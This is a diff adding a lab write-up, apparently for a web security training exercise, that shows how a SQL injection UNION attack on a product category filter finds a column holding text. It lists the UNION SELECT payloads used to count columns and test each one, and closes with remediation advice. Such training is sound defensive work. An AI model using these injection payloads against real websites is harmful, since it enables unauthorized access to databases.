@@ -1,0 +1,30 @@
+Lab: SQL injection UNION attack, finding a column containing text
+
+Vulnerability: SQL injection vulnerability in the product category filter
+
+Objective: Determine the columns which are compatible with string data
+
+Exploitation Steps:
+1. Open the lab and choose a product category eg. Gifts 
+2. In Burp Suite, go to Proxy tab, look for the category selection request in HTTP history and send it to Repeater.
+3. We will use UNION SELECT with NULL values to determine the number of columns. So we add:
+    - ' UNION SELECT NULL-- (error,add another NULL value)
+    - ' UNION SELECT NULL,NULL-- (error,add another NULL value)
+    - ' UNION SELECT NULL,NULL,NULL-- (no error, query was correct)
+  Hence number of columns was 3.
+4. After figuring this out we will check which columns support string data. For that we will put a string value instead of NULL for each column one by one
+    eg. - ' UNION SELECT 'A',NULL,NULL--
+          ' UNION SELECT NULL,'A',NULL--
+          ' UNION SELECT NULL,NULL,'A'--
+5. The query was accepted when the string value was given in second column. Hence the second column supports string data.
+6. Now place the required string in the compatible column to display it in the response and solve the lab.
+
+Result: We successfully displayed the string on the web application 
+
+Risk Involved: An attacker may identify columns that support string data and use them to extract sensitive information from the database.
+
+Remediation:
+- Use parameterized queries or prepared statements.
+- Avoid directly inserting user input into SQL queries.
+- Properly validate and sanitize user input.
+- Restrict detailed database error messages.
